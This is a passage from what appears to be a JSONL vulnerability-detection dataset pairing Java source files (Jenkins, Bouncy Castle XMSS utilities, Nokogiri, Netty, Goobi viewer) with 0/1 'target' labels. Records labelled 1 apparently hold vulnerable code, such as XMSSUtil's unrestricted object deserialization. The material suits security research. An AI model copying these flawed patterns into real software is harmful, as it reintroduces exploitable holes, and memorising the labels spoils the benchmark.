LOGGER.log(SEVERE, \"Failed to correct the problem.\");\n                }\n            }\n\n            installExpressionFactory(event);\n\n            context.setAttribute(APP,new HudsonIsLoading());\n\n            final File _home = home;\n            initThread = new Thread(\"Jenkins initialization thread\") {\n                @Override\n                public void run() {\n                    boolean success = false;\n                    try {\n                        Jenkins instance = new Hudson(_home, context);\n                        context.setAttribute(APP, instance);\n\n                        BootFailure.getBootFailureFile(_home).delete();\n\n                        // at this point we are open for business and serving requests normally\n                        LOGGER.info(\"Jenkins is fully up and running\");\n                        success = true;\n                    } catch (Error e) {\n                        new HudsonFailedToLoad(e).publish(context,_home);\n                        throw e;\n                    } catch (Exception e) {\n                        new HudsonFailedToLoad(e).publish(context,_home);\n                    } finally {\n                        Jenkins instance = Jenkins.getInstance();\n                        if(!success && instance!=null)\n                            instance.cleanUp();\n                    }\n                }\n            };\n            initThread.start();\n        } catch (BootFailure e) {\n            e.publish(context,home);\n        } catch (Error e) {\n            LOGGER.log(SEVERE, \"Failed to initialize Jenkins\",e);\n            throw e;\n        } catch (RuntimeException e) {\n            LOGGER.log(SEVERE, \"Failed to initialize Jenkins\",e);\n            throw e;\n        }\n    }\n\n    /**\n     * Set the session cookie as HTTP only.\n     *\n     * @see <a href=\"https://www.owasp.org/index.php/HttpOnly\">discussion of this topic in OWASP</a>\n     */\n    private void markCookieAsHttpOnly(ServletContext context) {\n        try {\n            Method m;\n            try {\n                m = context.getClass().getMethod(\"getSessionCookieConfig\");\n            } catch (NoSuchMethodException x) { // 3.0+\n                LOGGER.log(Level.FINE, \"Failed to set secure cookie flag\", x);\n                return;\n            }\n            Object sessionCookieConfig = m.invoke(context);\n\n            // not exposing session cookie to JavaScript to mitigate damage caused by XSS\n            Class scc = Class.forName(\"javax.servlet.SessionCookieConfig\");\n            Method setHttpOnly = scc.getMethod(\"setHttpOnly\",boolean.class);\n            setHttpOnly.invoke(sessionCookieConfig,true);\n        } catch (Exception e) {\n            LOGGER.log(Level.WARNING, \"Failed to set HTTP-only cookie flag\", e);\n        }\n    }\n\n    public void joinInit() throws InterruptedException {\n        initThread.join();\n    }\n\n    /**\n     * To assist boot failure script, record the number of boot attempts.\n     * This file gets deleted in case of successful boot.\n     *\n     * @see BootFailure\n     */\n    private void recordBootAttempt(File home) {\n        FileOutputStream o=null;\n        try {\n            o = new FileOutputStream(BootFailure.getBootFailureFile(home), true);\n            o.write((new Date().toString() + System.getProperty(\"line.separator\", \"\\n\")).toString().getBytes());\n        } catch (IOException e) {\n            LOGGER.log(WARNING, \"Failed to record boot attempts\",e);\n        } finally {\n            IOUtils.closeQuietly(o);\n        }\n    }\n\n    public static void installExpressionFactory(ServletContextEvent event) {\n        JellyFacet.setExpressionFactory(event, new ExpressionFactory2());\n    }\n\n\t/**\n     * Installs log handler to monitor all Hudson logs.\n     */\n    @edu.umd.cs.findbugs.annotations.SuppressWarnings(\"LG_LOST_LOGGER_DUE_TO_WEAK_REFERENCE\")\n    private void installLogger() {\n        Jenkins.logRecords = handler.getView();\n        Logger.getLogger(\"\").addHandler(handler);\n    }\n\n    /** Add some metadata to a File, allowing to trace setup issues */\n    public static class FileAndDescription {\n        public final File file;\n        public final String description;\n        public FileAndDescription(File file,String description) {\n            this.file = file;\n            this.description = description;\n        }\n    }\n\n    /**\n     * Determines the home directory for Jenkins.\n     *\n     * <p>\n     * We look for a setting that affects the smallest scope first, then bigger ones later.\n     *\n     * <p>\n     * People makes configuration mistakes, so we are trying to be nice\n     * with those by doing {@link String#trim()}.\n     * \n     * <p>\n     * @return the File alongside with some description to help the user troubleshoot issues\n     */\n    public FileAndDescription getHomeDir(ServletContextEvent event) {\n        // check JNDI for the home directory first\n        for (String name : HOME_NAMES) {\n            try {\n                InitialContext iniCtxt = new InitialContext();\n                Context env = (Context) iniCtxt.lookup(\"java:comp/env\");\n                String value = (String) env.lookup(name);\n                if(value!=null && value.trim().length()>0)\n                    return new FileAndDescription(new File(value.trim()),\"JNDI/java:comp/env/\"+name);\n                // look at one more place. See issue #1314\n                value = (String) iniCtxt.lookup(name);\n                if(value!=null && value.trim().length()>0)\n                    return new FileAndDescription(new File(value.trim()),\"JNDI/\"+name);\n            } catch (NamingException e) {\n                // ignore\n            }\n        }\n\n        // next the system property\n        for (String name : HOME_NAMES) {\n            String sysProp = System.getProperty(name);\n            if(sysProp!=null)\n                return new FileAndDescription(new File(sysProp.trim()),\"System.getProperty(\\\"\"+name+\"\\\")\");\n        }\n\n        // look at the env var next\n        for (String name : HOME_NAMES) {\n            String env = EnvVars.masterEnvVars.get(name);\n            if(env!=null)\n                return new FileAndDescription(new File(env.trim()).getAbsoluteFile(),\"EnvVars.masterEnvVars.get(\\\"\"+name+\"\\\")\");\n        }\n\n        // otherwise pick a place by ourselves\n\n        String root = event.getServletContext().getRealPath(\"/WEB-INF/workspace\");\n        if(root!=null) {\n            File ws = new File(root.trim());\n            if(ws.exists())\n                // Hudson <1.42 used to prefer this before ~/.hudson, so\n                // check the existence and if it's there, use it.\n                // otherwise if this is a new installation, prefer ~/.hudson\n                return new FileAndDescription(ws,\"getServletContext().getRealPath(\\\"/WEB-INF/workspace\\\")\");\n        }\n\n        File legacyHome = new File(new File(System.getProperty(\"user.home\")),\".hudson\");\n        if (legacyHome.exists()) {\n            return new FileAndDescription(legacyHome,\"$user.home/.hudson\"); // before rename, this is where it was stored\n        }\n\n        File newHome = new File(new File(System.getProperty(\"user.home\")),\".jenkins\");\n        return new FileAndDescription(newHome,\"$user.home/.jenkins\");\n    }\n\n    public void contextDestroyed(ServletContextEvent event) {\n        terminated = true;\n        Jenkins instance = Jenkins.getInstance();\n        if(instance!=null)\n            instance.cleanUp();\n        Thread t = initThread;\n        if (t!=null)\n            t.interrupt();\n\n        // Logger is in the system classloader, so if we don't do this\n        // the whole web app will never be undepoyed.\n        Logger.getLogger(\"\").removeHandler(handler);\n    }\n\n    private static final Logger LOGGER = Logger.getLogger(WebAppMain.class.getName());\n\n\n    private static final String[] HOME_NAMES = {\"JENKINS_HOME\",\"HUDSON_HOME\"};\n}\n", "target": 0}
{"idx": 1086, "func": "package org.bouncycastle.pqc.crypto.xmss;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\n\nimport org.bouncycastle.crypto.Digest;\nimport org.bouncycastle.util.Arrays;\nimport org.bouncycastle.util.encoders.Hex;\n\n/**\n * Utils for XMSS implementation.\n */\npublic class XMSSUtil\n{\n\n    /**\n     * Calculates the logarithm base 2 for a given Integer.\n     *\n     * @param n Number.\n     * @return Logarithm to base 2 of {@code n}.\n     */\n    public static int log2(int n)\n    {\n        int log = 0;\n        while ((n >>= 1) != 0)\n        {\n            log++;\n        }\n        return log;\n    }\n\n    /**\n     * Convert int/long to n-byte array.\n     *\n     * @param value      int/long value.\n     * @param sizeInByte Size of byte array in byte.\n     * @return int/long as big-endian byte array of size {@code sizeInByte}.\n     */\n    public static byte[] toBytesBigEndian(long value, int sizeInByte)\n    {\n        byte[] out = new byte[sizeInByte];\n        for (int i = (sizeInByte - 1); i >= 0; i--)\n        {\n            out[i] = (byte)value;\n            value >>>= 8;\n        }\n        return out;\n    }\n\n    /*\n     * Copy long to byte array in big-endian at specific offset.\n     */\n    public static void longToBigEndian(long value, byte[] in, int offset)\n    {\n        if (in == null)\n        {\n            throw new NullPointerException(\"in == null\");\n        }\n        if ((in.length - offset) < 8)\n        {\n            throw new IllegalArgumentException(\"not enough space in array\");\n        }\n        in[offset] = (byte)((value >> 56) & 0xff);\n        in[offset + 1] = (byte)((value >> 48) & 0xff);\n        in[offset + 2] = (byte)((value >> 40) & 0xff);\n        in[offset + 3] = (byte)((value >> 32) & 0xff);\n        in[offset + 4] = (byte)((value >> 24) & 0xff);\n        in[offset + 5] = (byte)((value >> 16) & 0xff);\n        in[offset + 6] = (byte)((value >> 8) & 0xff);\n        in[offset + 7] = (byte)((value) & 0xff);\n    }\n\n    /*\n     * Generic convert from big endian byte array to long.\n     */\n    public static long bytesToXBigEndian(byte[] in, int offset, int size)\n    {\n        if (in == null)\n        {\n            throw new NullPointerException(\"in == null\");\n        }\n        long res = 0;\n        for (int i = offset; i < (offset + size); i++)\n        {\n            res = (res << 8) | (in[i] & 0xff);\n        }\n        return res;\n    }\n\n    /**\n     * Clone a byte array.\n     *\n     * @param in byte array.\n     * @return Copy of byte array.\n     */\n    public static byte[] cloneArray(byte[] in)\n    {\n        if (in == null)\n        {\n            throw new NullPointerException(\"in == null\");\n        }\n        byte[] out = new byte[in.length];\n        for (int i = 0; i < in.length; i++)\n        {\n            out[i] = in[i];\n        }\n        return out;\n    }\n\n    /**\n     * Clone a 2d byte array.\n     *\n     * @param in 2d byte array.\n     * @return Copy of 2d byte array.\n     */\n    public static byte[][] cloneArray(byte[][] in)\n    {\n        if (hasNullPointer(in))\n        {\n            throw new NullPointerException(\"in has null pointers\");\n        }\n        byte[][] out = new byte[in.length][];\n        for (int i = 0; i < in.length; i++)\n        {\n            out[i] = new byte[in[i].length];\n            for (int j = 0; j < in[i].length; j++)\n            {\n                out[i][j] = in[i][j];\n            }\n        }\n        return out;\n    }\n\n    /**\n     * Compares two 2d-byte arrays.\n     *\n     * @param a 2d-byte array 1.\n     * @param b 2d-byte array 2.\n     * @return true if all values in 2d-byte array are equal false else.\n     */\n    public static boolean areEqual(byte[][] a, byte[][] b)\n    {\n        if (hasNullPointer(a) || hasNullPointer(b))\n        {\n            throw new NullPointerException(\"a or b == null\");\n        }\n        for (int i = 0; i < a.length; i++)\n        {\n            if (!Arrays.areEqual(a[i], b[i]))\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    /**\n     * Dump content of 2d byte array.\n     *\n     * @param x byte array.\n     */\n    public static void dumpByteArray(byte[][] x)\n    {\n        if (hasNullPointer(x))\n        {\n            throw new NullPointerException(\"x has null pointers\");\n        }\n        for (int i = 0; i < x.length; i++)\n        {\n            System.out.println(Hex.toHexString(x[i]));\n        }\n    }\n\n    /**\n     * Checks whether 2d byte array has null pointers.\n     *\n     * @param in 2d byte array.\n     * @return true if at least one null pointer is found false else.\n     */\n    public static boolean hasNullPointer(byte[][] in)\n    {\n        if (in == null)\n        {\n            return true;\n        }\n        for (int i = 0; i < in.length; i++)\n        {\n            if (in[i] == null)\n            {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    /**\n     * Copy src byte array to dst byte array at offset.\n     *\n     * @param dst    Destination.\n     * @param src    Source.\n     * @param offset Destination offset.\n     */\n    public static void copyBytesAtOffset(byte[] dst, byte[] src, int offset)\n    {\n        if (dst == null)\n        {\n            throw new NullPointerException(\"dst == null\");\n        }\n        if (src == null)\n        {\n            throw new NullPointerException(\"src == null\");\n        }\n        if (offset < 0)\n        {\n            throw new IllegalArgumentException(\"offset hast to be >= 0\");\n        }\n        if ((src.length + offset) > dst.length)\n        {\n            throw new IllegalArgumentException(\"src length + offset must not be greater than size of destination\");\n        }\n        for (int i = 0; i < src.length; i++)\n        {\n            dst[offset + i] = src[i];\n        }\n    }\n\n    /**\n     * Copy length bytes at position offset from src.\n     *\n     * @param src    Source byte array.\n     * @param offset Offset in source byte array.\n     * @param length Length of bytes to copy.\n     * @return New byte array.\n     */\n    public static byte[] extractBytesAtOffset(byte[] src, int offset, int length)\n    {\n        if (src == null)\n        {\n            throw new NullPointerException(\"src == null\");\n        }\n        if (offset < 0)\n        {\n            throw new IllegalArgumentException(\"offset hast to be >= 0\");\n        }\n        if (length < 0)\n        {\n            throw new IllegalArgumentException(\"length hast to be >= 0\");\n        }\n        if ((offset + length) > src.length)\n        {\n            throw new IllegalArgumentException(\"offset + length must not be greater then size of source array\");\n        }\n        byte[] out = new byte[length];\n        for (int i = 0; i < out.length; i++)\n        {\n            out[i] = src[offset + i];\n        }\n        return out;\n    }\n\n    /**\n     * Check whether an index is valid or not.\n     *\n     * @param height Height of binary tree.\n     * @param index  Index to validate.\n     * @return true if index is valid false else.\n     */\n    public static boolean isIndexValid(int height, long index)\n    {\n        if (index < 0)\n        {\n            throw new IllegalStateException(\"index must not be negative\");\n        }\n        return index < (1L << height);\n    }\n\n    /**\n     * Determine digest size of digest.\n     *\n     * @param digest Digest.\n     * @return Digest size.\n     */\n    public static int getDigestSize(Digest digest)\n    {\n        if (digest == null)\n        {\n            throw new NullPointerException(\"digest == null\");\n        }\n        String algorithmName = digest.getAlgorithmName();\n        if (algorithmName.equals(\"SHAKE128\"))\n        {\n            return 32;\n        }\n        if (algorithmName.equals(\"SHAKE256\"))\n        {\n            return 64;\n        }\n        return digest.getDigestSize();\n    }\n\n    public static long getTreeIndex(long index, int xmssTreeHeight)\n    {\n        return index >> xmssTreeHeight;\n    }\n\n    public static int getLeafIndex(long index, int xmssTreeHeight)\n    {\n        return (int)(index & ((1L << xmssTreeHeight) - 1L));\n    }\n\n    public static byte[] serialize(Object obj)\n        throws IOException\n    {\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(out);\n        oos.writeObject(obj);\n        oos.flush();\n        return out.toByteArray();\n    }\n\n    public static Object deserialize(byte[] data)\n        throws IOException, ClassNotFoundException\n    {\n        ByteArrayInputStream in = new ByteArrayInputStream(data);\n        ObjectInputStream is = new ObjectInputStream(in);\n        return is.readObject();\n    }\n\n    public static int calculateTau(int index, int height)\n    {\n        int tau = 0;\n        for (int i = 0; i < height; i++)\n        {\n            if (((index >> i) & 1) == 0)\n            {\n                tau = i;\n                break;\n            }\n        }\n        return tau;\n    }\n\n    public static boolean isNewBDSInitNeeded(long globalIndex, int xmssHeight, int layer)\n    {\n        if (globalIndex == 0)\n        {\n            return false;\n        }\n        return (globalIndex % (long)Math.pow((1 << xmssHeight), layer + 1) == 0) ? true : false;\n    }\n\n    public static boolean isNewAuthenticationPathNeeded(long globalIndex, int xmssHeight, int layer)\n    {\n        if (globalIndex == 0)\n        {\n            return false;\n        }\n        return ((globalIndex + 1) % (long)Math.pow((1 << xmssHeight), layer) == 0) ? true : false;\n    }\n}\n", "target": 1}
{"idx": 1087, "func": "/**\n * (The MIT License)\n *\n * Copyright (c) 2008 - 2011:\n *\n * * {Aaron Patterson}[http://tenderlovemaking.com]\n * * {Mike Dalessio}[http://mike.daless.io]\n * * {Charles Nutter}[http://blog.headius.com]\n * * {Sergio Arbeo}[http://www.serabe.com]\n * * {Patrick Mahoney}[http://polycrystal.org]\n * * {Yoko Harada}[http://yokolet.blogspot.com]\n *\n * Permission is hereby granted, free of charge, to any person obtaining\n * a copy of this software and associated documentation files (the\n * 'Software'), to deal in the Software without restriction, including\n * without limitation the rights to use, copy, modify, merge, publish,\n * distribute, sublicense, and/or sell copies of the Software, and to\n * permit persons to whom the Software is furnished to do so, subject to\n * the following conditions:\n * \n * The above copyright notice and this permission notice shall be\n * included in all copies or substantial portions of the Software.\n * \n * THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND,\n * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.\n * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY\n * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,\n * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE\n * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n */\n\npackage nokogiri;\n\nimport static nokogiri.internals.NokogiriHelpers.getNokogiriClass;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.StringWriter;\nimport java.io.UnsupportedEncodingException;\n\nimport javax.xml.transform.Source;\nimport javax.xml.transform.TransformerConfigurationException;\nimport javax.xml.transform.TransformerException;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport javax.xml.transform.stream.StreamSource;\n\nimport org.iso_relax.verifier.Schema;\nimport org.iso_relax.verifier.Verifier;\nimport org.iso_relax.verifier.VerifierConfigurationException;\nimport org.iso_relax.verifier.VerifierFactory;\nimport org.jruby.Ruby;\nimport org.jruby.RubyClass;\nimport org.jruby.anno.JRubyClass;\nimport org.jruby.runtime.ThreadContext;\nimport org.jruby.runtime.builtin.IRubyObject;\nimport org.w3c.dom.Document;\nimport org.xml.sax.ErrorHandler;\nimport org.xml.sax.SAXException;\n\n/**\n * Class for Nokogiri::XML::RelaxNG\n * \n * @author sergio\n * @author Yoko Harada <yokolet@gmail.com>\n */\n@JRubyClass(name=\"Nokogiri::XML::RelaxNG\", parent=\"Nokogiri::XML::Schema\")\npublic class XmlRelaxng extends XmlSchema {\n    private Verifier verifier;\n\n    public XmlRelaxng(Ruby ruby, RubyClass klazz) {\n        super(ruby, klazz);\n    }\n    \n    private void setVerifier(Verifier verifier) {\n        this.verifier = verifier;\n    }\n    \n    static XmlSchema createSchemaInstance(ThreadContext context, RubyClass klazz, Source source, IRubyObject parseOptions) {\n        Ruby runtime = context.getRuntime();\n        XmlRelaxng xmlRelaxng = (XmlRelaxng) NokogiriService.XML_RELAXNG_ALLOCATOR.allocate(runtime, klazz);\n\n        if (parseOptions == null) {\n            parseOptions = defaultParseOptions(context.getRuntime());\n        }\n\n        xmlRelaxng.setInstanceVariable(\"@errors\", runtime.newEmptyArray());\n        xmlRelaxng.setInstanceVariable(\"@parse_options\", parseOptions);\n\n        try {\n            Schema schema = xmlRelaxng.getSchema(source, context);\n            xmlRelaxng.setVerifier(schema.newVerifier());\n            return xmlRelaxng;\n        } catch (VerifierConfigurationException ex) {\n            throw context.getRuntime().newRuntimeError(\"Could not parse document: \" + ex.getMessage());\n        }\n    }\n\n    private Schema getSchema(Source source, ThreadContext context) {\n        InputStream is;\n        VerifierFactory factory = new com.thaiopensource.relaxng.jarv.VerifierFactoryImpl();\n        if (source instanceof StreamSource) {\n            StreamSource ss = (StreamSource)source;\n            is = ss.getInputStream();\n        } else { //if (this.source instanceof DOMSource)\n            DOMSource ds = (DOMSource)source;\n            StringWriter xmlAsWriter = new StringWriter();\n            StreamResult result = new StreamResult(xmlAsWriter);\n            try {\n                TransformerFactory.newInstance().newTransformer().transform(ds, result);\n            } catch (TransformerConfigurationException ex) {\n                throw context.getRuntime()\n                    .newRuntimeError(\"Could not parse document: \"+ex.getMessage());\n            } catch (TransformerException ex) {\n                throw context.getRuntime()\n                    .newRuntimeError(\"Could not parse document: \"+ex.getMessage());\n            }\n            try {\n                is = new ByteArrayInputStream(xmlAsWriter.toString().getBytes(\"UTF-8\"));\n            } catch (UnsupportedEncodingException ex) {\n                throw context.getRuntime()\n                    .newRuntimeError(\"Could not parse document: \"+ex.getMessage());\n            }\n        }\n\n        try {\n            return factory.compileSchema(is);\n        } catch (VerifierConfigurationException ex) {\n            throw context.getRuntime()\n                .newRuntimeError(\"Could not parse document: \"+ex.getMessage());\n        } catch (SAXException ex) {\n            throw context.getRuntime()\n                .newRuntimeError(\"Could not parse document: \"+ex.getMessage());\n        } catch (IOException ex) {\n            throw context.getRuntime().newIOError(ex.getMessage());\n        }\n    }\n    \n    @Override\n    protected void setErrorHandler(ErrorHandler errorHandler) {\n        verifier.setErrorHandler(errorHandler);\n    }\n    \n    @Override\n    protected void validate(Document document) throws SAXException, IOException {\n        verifier.verify(document);\n    }\n}\n", "target": 0}
{"idx": 1088, "func": "package jenkins.security;\n\nimport hudson.Extension;\nimport hudson.Lookup;\nimport hudson.init.InitMilestone;\nimport hudson.util.Secret;\nimport hudson.util.Service;\nimport jenkins.model.Jenkins;\nimport org.kohsuke.MetaInfServices;\n\nimport javax.annotation.CheckForNull;\nimport javax.annotation.Nonnull;\nimport java.io.IOException;\nimport java.security.SecureRandom;\nimport java.util.List;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\n/**\n * The actual storage for the data held by {@link ConfidentialKey}s, and the holder\n * of the master secret.\n *\n * <p>\n * This class is only relevant for the implementers of {@link ConfidentialKey}s.\n * Most plugin code should interact with {@link ConfidentialKey}s.\n *\n * <p>\n * OEM distributions of Jenkins can provide a custom {@link ConfidentialStore} implementation\n * by writing a subclass, mark it with {@link MetaInfServices} annotation, package it as a Jenkins module,\n * and bundling it with the war file. This doesn't use {@link Extension} because some plugins\n * have been found to use {@link Secret} before we get to {@link InitMilestone#PLUGINS_PREPARED}, and\n * therefore {@link Extension}s aren't loaded yet. (Similarly, it's conceivable that some future\n * core code might need this early on during the boot sequence.)\n *\n * @author Kohsuke Kawaguchi\n * @since 1.498\n */\npublic abstract class ConfidentialStore {\n    /**\n     * Persists the payload of {@link ConfidentialKey} to a persisted storage (such as disk.)\n     * The expectation is that the persisted form is secure.\n     */\n    protected abstract void store(ConfidentialKey key, byte[] payload) throws IOException;\n\n    /**\n     * Reverse operation of {@link #store(ConfidentialKey, byte[])}\n     *\n     * @return\n     *      null the data has not been previously persisted, or if the data was tampered.\n     */\n    protected abstract @CheckForNull byte[] load(ConfidentialKey key) throws IOException;\n\n    /**\n     * Works like {@link SecureRandom#nextBytes(byte[])}.\n     *\n     * This enables implementations to consult other entropy sources, if it's available.\n     */\n    public abstract byte[] randomBytes(int size);\n\n    /**\n     * Retrieves the currently active singleton instance of {@link ConfidentialStore}.\n     */\n    public static @Nonnull ConfidentialStore get() {\n        if (TEST!=null) return TEST.get();\n\n        Lookup lookup = Jenkins.getInstance().lookup;\n        ConfidentialStore cs = lookup.get(ConfidentialStore.class);\n        if (cs==null) {\n            try {\n                List<ConfidentialStore> r = (List) Service.loadInstances(ConfidentialStore.class.getClassLoader(), ConfidentialStore.class);\n                if (!r.isEmpty())\n                    cs = r.get(0);\n            } catch (IOException e) {\n                LOGGER.log(Level.WARNING, \"Failed to list up ConfidentialStore implementations\",e);\n                // fall through\n            }\n\n            if (cs==null)\n                try {\n                    cs = new DefaultConfidentialStore();\n                } catch (Exception e) {\n                    // if it's still null, bail out\n                    throw new Error(e);\n                }\n\n            cs = lookup.setIfNull(ConfidentialStore.class,cs);\n        }\n        return cs;\n    }\n\n    /**\n     * Testing only. Used for testing {@link ConfidentialKey} without {@link Jenkins}\n     */\n    /*package*/ static ThreadLocal<ConfidentialStore> TEST = null;\n\n    private static final Logger LOGGER = Logger.getLogger(ConfidentialStore.class.getName());\n}\n", "target": 0}
{"idx": 1089, "func": "/*\n * Copyright 2020 The Netty Project\n *\n * The Netty Project licenses this file to you under the Apache License,\n * version 2.0 (the \"License\"); you may not use this file except in compliance\n * with the License. You may obtain a copy of the License at:\n *\n *   https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n * License for the specific language governing permissions and limitations\n * under the License.\n */\npackage io.netty.handler.codec.http.multipart;\n\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.ByteBufUtil;\nimport io.netty.util.internal.PlatformDependent;\nimport org.junit.Test;\n\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.nio.charset.Charset;\nimport java.util.Arrays;\nimport java.util.UUID;\n\nimport static io.netty.util.CharsetUtil.UTF_8;\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertFalse;\n\n/**\n * {@link AbstractDiskHttpData} test cases\n */\npublic class AbstractDiskHttpDataTest {\n\n    @Test\n    public void testGetChunk() throws Exception {\n        TestHttpData test = new TestHttpData(\"test\", UTF_8, 0);\n        try {\n            File tmpFile = File.createTempFile(UUID.randomUUID().toString(), \".tmp\");\n            tmpFile.deleteOnExit();\n            FileOutputStream fos = new FileOutputStream(tmpFile);\n            byte[] bytes = new byte[4096];\n            PlatformDependent.threadLocalRandom().nextBytes(bytes);\n            try {\n                fos.write(bytes);\n                fos.flush();\n            } finally {\n                fos.close();\n            }\n            test.setContent(tmpFile);\n            ByteBuf buf1 = test.getChunk(1024);\n            assertEquals(buf1.readerIndex(), 0);\n            assertEquals(buf1.writerIndex(), 1024);\n            ByteBuf buf2 = test.getChunk(1024);\n            assertEquals(buf2.readerIndex(), 0);\n            assertEquals(buf2.writerIndex(), 1024);\n            assertFalse(\"Arrays should not be equal\",\n                    Arrays.equals(ByteBufUtil.getBytes(buf1), ByteBufUtil.getBytes(buf2)));\n        } finally {\n            test.delete();\n        }\n    }\n\n    private static final class TestHttpData extends AbstractDiskHttpData {\n\n        private TestHttpData(String name, Charset charset, long size) {\n            super(name, charset, size);\n        }\n\n        @Override\n        protected String getDiskFilename() {\n            return null;\n        }\n\n        @Override\n        protected String getPrefix() {\n            return null;\n        }\n\n        @Override\n        protected String getBaseDirectory() {\n            return null;\n        }\n\n        @Override\n        protected String getPostfix() {\n            return null;\n        }\n\n        @Override\n        protected boolean deleteOnExit() {\n            return false;\n        }\n\n        @Override\n        public HttpData copy() {\n            return null;\n        }\n\n        @Override\n        public HttpData duplicate() {\n            return null;\n        }\n\n        @Override\n        public HttpData retainedDuplicate() {\n            return null;\n        }\n\n        @Override\n        public HttpData replace(ByteBuf content) {\n            return null;\n        }\n\n        @Override\n        public HttpDataType getHttpDataType() {\n            return null;\n        }\n\n        @Override\n        public int compareTo(InterfaceHttpData o) {\n            return 0;\n        }\n    }\n}\n", "target": 1}
{"idx": 1090, "func": "/**\n * This file is part of the Goobi viewer - a content presentation and management application for digitized objects.\n *\n * Visit these websites for more information.\n *          - http://www.intranda.com\n *          - http://digiverso.com\n *\n * This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free\n * Software Foundation; either version 2 of the License, or (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License along with this program. If not, see <http://www.gnu.org/licenses/>.\n */\npackage io.goobi.viewer.controller;\n\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport javax.servlet.http.HttpServletRequest;\n\nimport org.apache.commons.io.FilenameUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport de.unigoettingen.sub.commons.contentlib.exceptions.ContentLibException;\nimport de.unigoettingen.sub.commons.contentlib.exceptions.ContentNotFoundException;\nimport de.unigoettingen.sub.commons.contentlib.exceptions.ServiceNotAllowedException;\nimport io.goobi.viewer.api.rest.AbstractApiUrlManager;\nimport io.goobi.viewer.api.rest.resourcebuilders.TextResourceBuilder;\nimport io.goobi.viewer.exceptions.AccessDeniedException;\nimport io.goobi.viewer.exceptions.DAOException;\nimport io.goobi.viewer.exceptions.HTTPException;\nimport io.goobi.viewer.exceptions.IndexUnreachableException;\nimport io.goobi.viewer.exceptions.PresentationException;\nimport io.goobi.viewer.exceptions.ViewerConfigurationException;\nimport io.goobi.viewer.managedbeans.utils.BeanUtils;\n\n/**\n * Utility class for retrieving data folders, data files and source files.\n *\n */\npublic class DataFileTools {\n\n    private static final Logger logger = LoggerFactory.getLogger(DataFileTools.class);\n\n\n    /**\n     * Retrieves the path to viewer home or repositories root, depending on the record. Used to generate a specific task client query parameter.\n     *\n     * @param pi Record identifier\n     * @return The root folder path of the data repositories; viewer home if none are used\n     * @throws io.goobi.viewer.exceptions.PresentationException if any.\n     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.\n     */\n    public static String getDataRepositoryPathForRecord(String pi) throws PresentationException, IndexUnreachableException {\n        String dataRepositoryPath = DataManager.getInstance().getSearchIndex().findDataRepositoryName(pi);\n        return getDataRepositoryPath(dataRepositoryPath);\n    }\n\n    /**\n     * Returns the absolute path to the data repository with the given name (including a slash at the end). Package private to discourage direct usage\n     * by clients.\n     *\n     * @param dataRepositoryPath Data repository name or absolute path\n     * @return\n     * @should return correct path for empty data repository\n     * @should return correct path for data repository name\n     * @should return correct path for absolute data repository path\n     */\n    static String getDataRepositoryPath(String dataRepositoryPath) {\n        if (StringUtils.isBlank(dataRepositoryPath)) {\n            return DataManager.getInstance().getConfiguration().getViewerHome();\n        }\n\n        if (Paths.get(FileTools.adaptPathForWindows(dataRepositoryPath)).isAbsolute()) {\n            return dataRepositoryPath + '/';\n        }\n\n        return DataManager.getInstance().getConfiguration().getDataRepositoriesHome() + dataRepositoryPath + '/';\n    }\n\n    /**\n     * Constructs the media folder path for the given pi, either directly in viewer-home or within a data repository\n     *\n     * @param pi The work PI. This is both the actual name of the folder and the identifier used to look up data repository in solr\n     * @return A Path to the media folder for the given PI\n     * @throws io.goobi.viewer.exceptions.PresentationException if any.\n     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.\n     */\n    public static Path getMediaFolder(String pi) throws PresentationException, IndexUnreachableException {\n        return getDataFolder(pi, DataManager.getInstance().getConfiguration().getMediaFolder());\n    }\n\n    /**\n     * Returns a map of Paths for each data folder name passed as an argument.\n     *\n     * @param pi The record identifier. This is both the actual name of the folder and the identifier used to look up data repository in Solr\n     * @return HashMap<dataFolderName,Path>\n     * @should return all requested data folders\n     * @param dataFolderNames a {@link java.lang.String} object.\n     * @throws io.goobi.viewer.exceptions.PresentationException if any.\n     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.\n     */\n    public static Map<String, Path> getDataFolders(String pi, String... dataFolderNames) throws PresentationException, IndexUnreachableException {\n        if (pi == null) 